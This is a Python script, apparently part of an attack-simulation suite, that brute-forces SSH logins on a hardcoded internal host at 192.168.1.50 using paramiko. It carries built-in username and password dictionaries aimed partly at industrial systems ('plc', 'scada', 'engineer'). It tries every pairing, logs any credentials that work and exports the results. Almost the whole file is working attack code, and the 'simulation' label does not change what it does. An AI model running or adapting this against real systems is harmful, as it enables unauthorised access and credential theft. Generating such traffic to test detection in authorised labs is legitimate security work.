#!/usr/bin/env python3
"""
04_brute_force.py: SSH and service brute force simulation.

Simulates dictionary-based brute force attacks against SSH and other
network services using paramiko for controlled testing.
"""

import json
import logging
import sys
import time
from datetime import datetime
from typing import Dict, List, Tuple, Any

import paramiko
from paramiko import SSHException, AuthenticationException

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class BruteForceSimulator:
    """Simulates brute force attacks against SSH and services."""

    def __init__(self, target_host: str, target_port: int = 22, timeout: int = 5):
        """
        Initialize brute force simulator.

        Args:
            target_host: Target host IP or hostname.
            target_port: Target service port (default SSH 22).
            timeout: Connection timeout in seconds.
        """
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.attack_log = []

    def load_wordlist(self) -> Tuple[List[str], List[str]]:
        """
        Load username and password wordlists.

        Returns:
            Tuple of (usernames, passwords) lists.
        """
        common_usernames = [
            "root", "admin", "test", "guest", "pi", "plc", "scada",
            "operator", "engineer", "user", "daemon"
        ]

        common_passwords = [
            "password", "123456", "admin", "root", "12345678",
            "password123", "admin123", "letmein", "welcome", "default"
        ]

        logger.info(f"Loaded {len(common_usernames)} usernames and {len(common_passwords)} passwords")
        return common_usernames, common_passwords

    def attempt_ssh_login(self, username: str, password: str) -> bool:
        """
        Attempt single SSH login.

        Args:
            username: Username to try.
            password: Password to try.

        Returns:
            True if login successful, False otherwise.
        """
        attempt_record = {
            "timestamp": datetime.utcnow().isoformat(),
            "attack_type": "ssh_brute_force",
            "target": f"{self.target_host}:{self.target_port}",
            "username": username,
            "password": password,
            "success": False
        }

        try:
            self.ssh_client.connect(
                hostname=self.target_host,
                port=self.target_port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )

            logger.warning(f"SUCCESS: SSH login {username}:{password} on {self.target_host}")
            attempt_record["success"] = True
            self.attack_log.append(attempt_record)
            self.ssh_client.close()
            return True

        except AuthenticationException:
            self.attack_log.append(attempt_record)
            return False
        except (SSHException, Exception) as e:
            logger.debug(f"Connection error: {str(e)}")
            attempt_record["error"] = str(e)
            self.attack_log.append(attempt_record)
            return False

    def execute_brute_force(
        self,
        usernames: List[str],
        passwords: List[str],
        delay: float = 0.5
    ) -> Dict[str, Any]:
        """
        Execute brute force attack against target.

        Args:
            usernames: List of usernames to try.
            passwords: List of passwords to try.
            delay: Delay between attempts in seconds.

        Returns:
            Summary of attack results.
        """
        logger.warning(f"=== INITIATING SSH BRUTE FORCE ON {self.target_host} ===")
        logger.warning(f"Attempting {len(usernames)} x {len(passwords)} = {len(usernames) * len(passwords)} combinations")

        successful_logins = []
        total_attempts = 0

        for username in usernames:
            for password in passwords:
                total_attempts += 1

                if self.attempt_ssh_login(username, password):
                    successful_logins.append({
                        "username": username,
                        "password": password
                    })
                    logger.warning(f"CREDENTIALS FOUND: {username}:{password}")

                time.sleep(delay)

        summary = {
            "timestamp": datetime.utcnow().isoformat(),
            "attack_type": "ssh_brute_force",
            "target": self.target_host,
            "total_attempts": total_attempts,
            "successful_logins": successful_logins,
            "success_rate": len(successful_logins) / total_attempts if total_attempts > 0 else 0,
            "total_events_logged": len(self.attack_log)
        }

        logger.warning(f"Brute force complete: {len(successful_logins)} successful logins from {total_attempts} attempts")
        return summary

    def export_log(self, filepath: str) -> None:
        """Export attack log to JSON."""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
            logger.info(f"Attack log exported to {filepath}")
        except Exception as e:
            logger.error(f"Export failed: {str(e)}")


def main() -> int:
    """Execute SSH brute force simulation."""
    try:
        attacker = BruteForceSimulator(target_host="192.168.1.50", target_port=22)
        usernames, passwords = attacker.load_wordlist()

        # Execute brute force with 0.5 second delays
        summary = attacker.execute_brute_force(
            usernames=usernames,
            passwords=passwords,
            delay=0.5
        )

        attacker.export_log("/tmp/brute_force.json")

        print(json.dumps(summary, indent=2))
        return 0 if summary["successful_logins"] else 1

    except Exception as e:
        logger.error(f"Fatal error: {str(e)}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
